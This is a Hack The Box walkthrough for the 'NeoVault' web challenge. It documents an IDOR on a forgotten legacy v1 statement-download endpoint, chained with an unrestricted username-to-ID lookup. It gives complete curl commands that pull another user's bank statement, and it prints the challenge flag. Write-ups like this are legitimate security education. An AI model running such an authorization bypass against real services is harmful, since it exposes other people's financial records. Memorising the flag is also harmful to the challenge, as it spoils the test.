# NeoVault - HTB Walkthrough

| Field | Value |
|---|---|
| Challenge type | Web application |
| Tech stack | Next.js frontend, REST API with two coexisting versions (v1 and v2) |
| Flag location | A transaction description field, delivered inside a generated PDF bank statement |
| Vulnerability chain | Broken Object Level Authorization (IDOR) on a legacy v1 endpoint, chained with an unauthenticated username-to-ID lookup |
| Flag | `HTB{n0t_s0_3asy_1d0r}` |

---

## Key Technologies - What They Are

**IDOR (Insecure Direct Object Reference)** - A bug where an endpoint accepts an identifier for a resource (a user ID, account ID, document ID) directly from the client and returns or acts on that resource without confirming the requester actually owns it.

**API versioning drift** - When a v2 API replaces v1, old v1 routes are often intentionally disabled or redirected. If even one v1 route is missed during that migration, it can retain the older, weaker authorization logic while everything else on the app has been hardened.

---

## Architecture

```
[Browser] ──→ Next.js frontend (dashboard, transfer, login, register pages)
           ──→ /api/v2/auth/*            (current auth: register, login, me, logout)
           ──→ /api/v2/auth/inquire?username=<name>   (resolve a username to its _id)
           ──→ /api/v2/transactions/*    (current transaction API - properly scoped to the session user)
           ──→ /api/v1/*                 (legacy API - mostly returns "API v1 is deprecated")
```

NeoVault is a small banking demo app: register, log in, view a dashboard with balance/transaction history, transfer funds to another user by username, and download a PDF bank statement. Auth is a JWT stored in an httpOnly `token` cookie.

The frontend's own JS bundle ships a config object listing every known endpoint under both `endpointsV1` and `endpointsV2` keys, which is how the full API surface (including the legacy v1 routes) was enumerated without any server-side directory brute forcing.

---

## Vulnerability Chain Summary

```
Step 1: Register a normal account, log in, explore the app's features
Step 2: Pull the frontend JS bundle and read the endpoints config object -
        confirms both /api/v1/* and /api/v2/* routes exist
Step 3: Most /api/v1/* routes return {"message":"API v1 is deprecated..."} -
        except /api/v1/transactions/download-transactions, which still works
        and takes an _id parameter with no ownership check
Step 4: Use /api/v2/auth/inquire?username=<name> (also unauthenticated-scope,
        no restriction on whose username you can resolve) to turn any known
        username into its _id
Step 5: Feed that _id into the vulnerable v1 endpoint - get that user's
        full PDF bank statement, including transaction descriptions
Step 6: The flag is embedded as a transaction description in
        user_with_flag's statement
```

---

## Bug - IDOR on a Legacy v1 Endpoint

### Discovering the endpoint

The dashboard's "Download Statement" button calls the current, properly-scoped endpoint:

```
POST /api/v2/transactions/download-transactions
```

which returns a PDF for whichever user is authenticated via the session cookie - no parameters needed, no way to specify another user.

Reading the frontend bundle's endpoint map showed the same feature also exists under `/api/v1/`:

```javascript
{
  endpointsV1: {
    ...
    downloadTransactions: "/api/v1/transactions/download-transactions"
  },
  endpointsV2: {
    ...
    downloadTransactions: "/api/v2/transactions/download-transactions",
    inquireUser: "/api/v2/auth/inquire"
  }
}
```

Most `/api/v1/*` routes, when called, respond with:

```json
{"message":"API v1 is deprecated. Please use API v2."}
```

confirming that the developers intended to retire the whole v1 surface. However `POST /api/v1/transactions/download-transactions` was missed - instead of the deprecation message, calling it with an empty body returns:

```json
{"message":"_id is not provided"}
```

which reveals the parameter it expects, and that it was never migrated to the ownership-checked logic used by v2.

### Confirming the IDOR

Supplying the logged-in user's own `_id` in the body returns that user's own statement, confirming the parameter's purpose:

```bash
curl -s -b cookies.txt -X POST \
  http://<target>/api/v1/transactions/download-transactions \
  -H 'Content-Type: application/json' \
  -d '{"_id":"<own_id>"}' \
  -o statement_v1_own.pdf
```

Supplying a different user's `_id` instead - with the exact same authenticated session - returns *their* statement instead, with no authorization check that the requested `_id` matches the session's own user:

```bash
curl -s -b cookies.txt -X POST \
  http://<target>/api/v1/transactions/download-transactions \
  -H 'Content-Type: application/json' \
  -d '{"_id":"<other_user_id>"}' \
  -o statement_other_user.pdf
```

### Finding a victim ID without any leak

The registration flow gives every new user a "welcome bonus" transaction from a system account, `neo_system`. Pulling that account's own statement through the IDOR (using its `_id`, visible as the sender on the welcome-bonus transaction) revealed a transaction to another username, `user_with_flag`.

`/api/v2/auth/inquire?username=<name>` resolves any username to its `_id` with no restriction on whose username can be queried:

```bash
curl -s -b cookies.txt "http://<target>/api/v2/auth/inquire?username=user_with_flag"
```

```json
{"_id":"6a63765d45517bf1394d03ac","username":"user_with_flag"}
```

### Full exploit chain

```bash
# 1. Register + log in as a normal user (cookies.txt captures the httpOnly token cookie)
curl -s -c cookies.txt -X POST http://<target>/api/v2/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest1","email":"pentest1@example.com","password":"Password123"}'

curl -s -b cookies.txt -c cookies.txt -X POST http://<target>/api/v2/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentest1","password":"Password123"}'

# 2. Resolve the victim's user ID via the unrestricted username lookup
curl -s -b cookies.txt "http://<target>/api/v2/auth/inquire?username=user_with_flag"
# -> {"_id":"6a63765d45517bf1394d03ac", ...}

# 3. Pull their statement through the IDOR on the legacy v1 endpoint
curl -s -b cookies.txt -X POST \
  http://<target>/api/v1/transactions/download-transactions \
  -H 'Content-Type: application/json' \
  -d '{"_id":"6a63765d45517bf1394d03ac"}' \
  -o statement_flag.pdf
```

The resulting PDF's transaction table contains:

```
7/17/2026   user_with_flag   user_with_flag   HTB{n0t_s0_3asy_1d0r}   1337.00
```

---

## Root Cause

Two independent authorization gaps combine here. First, `/api/v2/auth/inquire` resolves a username to an internal `_id` for any username, with no check that the caller has any relationship to that account - this alone is only an information leak, but it is the key that unlocks the second bug. Second, and more seriously, `/api/v1/transactions/download-transactions` was left reachable after the API version migration and never received the ownership check present in its v2 replacement, so any authenticated session can generate a full bank statement PDF for any other user simply by supplying their `_id`.

The general lesson: when retiring an API version, every route must be either torn down completely or migrated with equivalent authorization logic - a single overlooked legacy endpoint reintroduces the exact class of bug the new version was built to fix.

---

## Flag

```
HTB{n0t_s0_3asy_1d0r}
```
